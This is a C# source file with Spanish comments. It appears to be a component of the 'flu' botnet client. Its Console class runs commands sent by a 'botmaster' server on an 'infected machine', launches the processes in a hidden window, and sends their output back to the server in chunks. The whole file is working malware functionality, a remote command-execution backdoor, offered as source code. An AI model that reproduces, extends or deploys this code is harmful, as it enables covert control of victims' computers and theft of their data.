using System;
using System.Diagnostics;

namespace flu
{
    /// <summary>
    /// La clase Console se encarga de ejecutar los comandos enviados desde el servidor
    /// </summary>
    class Console
    {
        private static Process cmd;

        /// <summary>
        /// Ejecuta el comando solicitado, y envía la respuesta al botmaster
        /// </summary>
        /// <param name="command">Comando solicitado</param>
        /// <param name="parameters">Parámetros requeridos por el comando</param>
        /// <param name="uniqueID">ID único que identifica el comando solicitado, para que el botmaster sepa a que comando corresponde la respuesta enviada</param>
        public static void ExecuteAndSend(string command, string parameters, string uniqueID)
        {
            string fic = OS.InfectionPath() + "\\_debug_err_win_32.txt";

            if (parameters == "cat _debug_err_win_32.txt") { parameters = "cat " + fic; }

            parameters = parameters.Replace("\\","\\\\");

            Console.Execute(command, parameters);
            string output;
            int lines = 0;
            string temp = "";

            while ((output = cmd.StandardOutput.ReadLine()) != null)
            {
                if ((++lines % 50) == 0)
                {
                    temp += output + "<br/>";
                    Network.SendInformation(temp, command, uniqueID, 0);
                    temp = "";
                }
                else { temp += output + "<br/>"; }
            }
            Network.SendInformation(temp, command, uniqueID, 1);
        }

        /// <summary>
        /// Ejecuta un comando (que no requiere enviar una respuesta al botmaster) en la máquina infectada
        /// </summary>
        /// <param name="command">Comando enviado</param>
        /// <param name="parameters">Parámetros requeridos por el comando</param>
        public static void Execute(string command, string parameters)
        {
            cmd = new Process();
            cmd.EnableRaisingEvents = true;
            cmd.Exited += new EventHandler(cmd_Exited);
            cmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.RedirectStandardInput = false;
            cmd.StartInfo.UseShellExecute = false;
            cmd.StartInfo.FileName = command;
            cmd.StartInfo.Arguments = parameters;
            cmd.Start();
        }

        private static void cmd_Exited(object sender, EventArgs e) { }
    }
}
